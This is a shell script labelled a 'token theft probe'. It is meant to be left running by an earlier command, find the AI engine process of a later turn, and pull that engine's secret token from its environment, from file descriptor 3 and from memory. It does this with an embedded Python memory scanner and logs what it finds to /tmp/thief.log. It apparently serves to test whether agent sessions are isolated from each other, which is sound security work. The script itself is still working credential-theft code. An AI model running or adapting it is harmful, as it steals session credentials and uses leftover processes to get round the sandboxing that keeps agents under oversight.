#!/bin/sh
# Token theft probe: a process left behind by an earlier command watches for the AI engine of a later turn and tries
# to read its token (environment, fd 3, memory). Output: /tmp/thief.log
exec >/tmp/thief.log 2>&1
end=$(( $(date +%s) + ${1:-60} ))
while [ "$(date +%s)" -lt "$end" ]; do
  for d in /proc/[0-9]*; do
    grep -qa '/opt/claude/claude' "$d/cmdline" 2>/dev/null || continue
    pid=${d#/proc/}; n=$(cat "/tmp/seen.$pid" 2>/dev/null || echo 0); [ "$n" -ge 3 ] && continue; echo $((n+1)) > "/tmp/seen.$pid"; sleep 1
    echo "engine pid $pid"
    tr '\0' '\n' < "$d/environ" 2>&1 | grep -E 'TOKEN|mpx_' | sed 's/^/environ: /'
    ls -l "$d/fd/" 2>&1 | sed 's/^/fd: /' | head -12
    timeout 1 cat "$d/fd/3" 2>&1 | head -c 200 | sed 's/^/fd3: /'; echo
    python3 -c "
import re,sys
pid=$pid; hits=set()
try:
    maps=open(f'/proc/{pid}/maps').read().splitlines(); mem=open(f'/proc/{pid}/mem','rb',0)
except Exception as e: print('mem: refused:', e); sys.exit()
for l in maps:
    a,b=[int(x,16) for x in l.split()[0].split('-')]
    if 'r' not in l.split()[1]: continue
    for o in range(a, b, 64<<20):
        try: mem.seek(o); buf=mem.read(min(64<<20, b-o)); hits.update(re.findall(rb'mpx_[A-Za-z0-9_-]{43}', buf)); hits.update(m.replace(b'\\0',b'') for m in re.findall(rb'm\\0p\\0x\\0_\\0(?:[A-Za-z0-9_-]\\0){43}', buf))
        except Exception: pass
print('mem: tokens found:', [h.decode() for h in hits])
" 2>&1
  done
  sleep 0.2
done
